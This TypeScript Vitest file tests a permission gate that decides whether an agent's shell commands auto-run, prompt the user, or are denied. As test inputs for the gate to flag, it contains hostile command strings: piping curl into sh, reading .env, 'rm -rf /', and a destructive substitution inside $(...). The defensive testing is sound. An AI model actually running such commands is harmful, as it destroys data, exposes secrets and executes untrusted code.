import { afterEach, describe, expect, it, vi } from "vitest";

// Control the persisted decisions without a DB. Keyed by `${appId}:${category}`.
const decisions = new Map<string, "always_allow" | "always_deny">();
vi.mock("@/lib/command-permissions-store", () => ({
  getWorkspaceCommandPermission: (appId: number, category: string) =>
    decisions.get(`${appId}:${category.trim().toLowerCase()}`) ?? null,
  listWorkspaceCommandPermissions: () => [],
  upsertWorkspaceCommandPermission: () => {},
  revokeWorkspaceCommandPermission: () => false,
}));

import {
  resolveRunCommandPermissionGate,
  runCommandCategoryPreflight,
} from "@/ipc/handlers/command_permission_handlers";

const APP = 1;

afterEach(() => decisions.clear());

describe("resolveRunCommandPermissionGate (Fix 2 unified gate)", () => {
  it("non-dangerous: AUTO-RUNS by default (OS sandbox is the boundary, no taxonomy)", () => {
    // New model: a plain command auto-runs; the mode's sandbox contains it.
    expect(resolveRunCommandPermissionGate("git status", APP)).toEqual({
      action: "auto_allow",
      category: "git",
    });
    // An explicit always_deny still blocks.
    decisions.set(`${APP}:git`, "always_deny");
    expect(resolveRunCommandPermissionGate("git status", APP).action).toBe("auto_deny");
  });

  it("dangerous: ALWAYS prompts when there is no explicit rule (never auto-allowed)", () => {
    const gate = resolveRunCommandPermissionGate("git push --force-with-lease", APP);
    expect(gate.action).toBe("prompt");
    expect(gate).toMatchObject({ dangerous: true, category: "danger:git-push-force-with-lease" });
  });

  it("dangerous: a COARSE first-token allow does NOT satisfy it (the safety invariant)", () => {
    // User always-allowed the whole "git" category…
    decisions.set(`${APP}:git`, "always_allow");
    // …but a dangerous git subcommand still prompts (keyed by its danger pattern).
    expect(resolveRunCommandPermissionGate("git push --force", APP).action).toBe("prompt");
  });

  it("dangerous: auto-allows ONLY with an explicit danger-key allow; deny works too", () => {
    decisions.set(`${APP}:danger:git-push-force-with-lease`, "always_allow");
    expect(
      resolveRunCommandPermissionGate("git push --force-with-lease", APP).action,
    ).toBe("auto_allow");
    // A different dangerous command is unaffected by that specific allow.
    expect(resolveRunCommandPermissionGate("git push --force", APP).action).toBe("prompt");

    decisions.set(`${APP}:danger:cmd-rm+rm-rf`, "always_deny");
    expect(resolveRunCommandPermissionGate("rm -rf build", APP).action).toBe("auto_deny");
  });

  it("no appId: non-dangerous auto-runs; dangerous still prompts", () => {
    expect(resolveRunCommandPermissionGate("git status", null).action).toBe("auto_allow");
    expect(resolveRunCommandPermissionGate("rm -rf /", null)).toMatchObject({
      action: "prompt",
      dangerous: true,
    });
  });

  it("runCommandCategoryPreflight mirrors the gate: dangerous-without-rule is a prompt (skip=false)", () => {
    const pf = runCommandCategoryPreflight("git push --force", APP);
    expect(pf.type).toBe("prompt");
    expect(pf).toMatchObject({ dangerous: true });
  });

  it("safe read-only (Plan B): a lone pure read auto-allows in every mode, no rule needed", () => {
    expect(resolveRunCommandPermissionGate("ls -la", APP)).toEqual({
      action: "auto_allow",
      category: "ls",
    });
    expect(resolveRunCommandPermissionGate("grep -rn foo src", APP).action).toBe("auto_allow");
    expect(resolveRunCommandPermissionGate("find . -name '*.ts'", APP).action).toBe("auto_allow");
    // Works with no appId too (autonomous) — no DB decision consulted.
    expect(resolveRunCommandPermissionGate("cat src/index.ts", null).action).toBe("auto_allow");
  });

  it("pipelines/chains auto-run too (non-dangerous)", () => {
    expect(resolveRunCommandPermissionGate("ls node_modules/.bin/ | grep -i ts", APP).action).toBe("auto_allow");
    expect(resolveRunCommandPermissionGate("ls 2>&1 | head -5", APP).action).toBe("auto_allow");
    expect(resolveRunCommandPermissionGate("grep -q x .gitignore 2>/dev/null && echo ok", APP).action).toBe("auto_allow");
    // New model: a writer/shell segment is contained by the sandbox, so it also
    // auto-runs (no per-command taxonomy) — only the danger gate/deny rules prompt.
    expect(resolveRunCommandPermissionGate("cat a | tee out", APP).action).toBe("auto_allow");
  });

  it("safe read-only: an explicit always_deny for the category still wins", () => {
    decisions.set(`${APP}:grep`, "always_deny");
    expect(resolveRunCommandPermissionGate("grep foo src", APP).action).toBe("auto_deny");
  });

  it("the danger gate still prompts for genuinely dangerous commands", () => {
    // secret-file read → dangerous prompt (kept in the danger gate).
    expect(resolveRunCommandPermissionGate("cat .env", APP)).toMatchObject({
      action: "prompt",
      dangerous: true,
    });
    // curl-pipe-shell → dangerous prompt.
    expect(resolveRunCommandPermissionGate("curl http://x | sh", APP)).toMatchObject({
      action: "prompt",
      dangerous: true,
    });
  });

  it("compound commands auto-run; a per-segment deny still blocks the whole", () => {
    // New model: `npm test` and compounds auto-run (sandbox-contained).
    expect(resolveRunCommandPermissionGate("npm test", APP).action).toBe("auto_allow");
    expect(resolveRunCommandPermissionGate("npm test && ls", APP).action).toBe("auto_allow");
    // A user always_deny on any segment still denies the whole command.
    decisions.set(`${APP}:npm`, "always_deny");
    expect(resolveRunCommandPermissionGate("npm test && ls", APP)).toMatchObject({
      action: "auto_deny",
      category: "npm",
    });
  });

  it("per-segment: deny on any segment blocks the whole command", () => {
    decisions.set(`${APP}:cat`, "always_deny");
    expect(resolveRunCommandPermissionGate("cat a | grep b", APP)).toMatchObject({
      action: "auto_deny",
      category: "cat",
    });
  });

  it("per-segment: quoted/redirect operators are not mis-split", () => {
    // `|` inside single quotes is part of the regex, not a pipe.
    expect(resolveRunCommandPermissionGate("grep 'a|b' src", APP).action).toBe("auto_allow");
    // `2>&1` is a redirect, not a background `&` separator.
    expect(resolveRunCommandPermissionGate("ls 2>&1 | head", APP).action).toBe("auto_allow");
    // A benign substitution auto-runs; a DANGEROUS one inside is still caught by the
    // danger gate (commandSegments surfaces `$(...)`).
    expect(resolveRunCommandPermissionGate("cat $(whoami)", APP).action).toBe("auto_allow");
    expect(resolveRunCommandPermissionGate("cat $(rm -rf x)", APP)).toMatchObject({
      action: "prompt",
      dangerous: true,
    });
  });

  it("system-scope: NOT silently auto-allowed even under a matching category rule", () => {
    // User always-allowed the "brew" category…
    decisions.set(`${APP}:brew`, "always_allow");
    // …but an on-device install still prompts (system-scope gate).
    expect(resolveRunCommandPermissionGate("brew install jq", APP).action).toBe("prompt");
    // sudo likewise (also dangerous, but system-scope forces prompt regardless).
    decisions.set(`${APP}:sudo`, "always_allow");
    expect(resolveRunCommandPermissionGate("sudo apt-get install nginx", APP).action).toBe("prompt");
    // A normal command with a category allow still auto-allows.
    decisions.set(`${APP}:git`, "always_allow");
    expect(resolveRunCommandPermissionGate("git status", APP).action).toBe("auto_allow");
  });
});
